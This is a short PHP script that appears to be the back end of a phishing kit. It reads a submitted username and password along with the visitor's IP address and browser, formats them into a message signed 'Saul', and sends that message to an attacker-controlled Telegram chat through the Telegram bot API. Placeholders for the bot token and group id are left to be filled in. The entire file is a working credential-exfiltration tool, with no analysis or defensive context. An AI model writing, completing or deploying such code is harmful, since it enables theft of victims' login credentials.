<?php
$content = '';
    
$ip = $_SERVER['REMOTE_ADDR'];
$uname = $_POST['uname'];
$pwd = $_POST['pwd'];
$agent = $_SERVER['HTTP_USER_AGENT'];

$content = "+----------------+\nIP=$ip \nUsername=$uname \nPassword=$pwd \nBrowser=$agent\n+------Saul------+";
echo $content;

//Put your api token here
$apiToken = "";
$data = [
    //Your group name
    'chat_id' => '',
    'text' => $content,
    'parse_mode' => 'HTML'
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
?>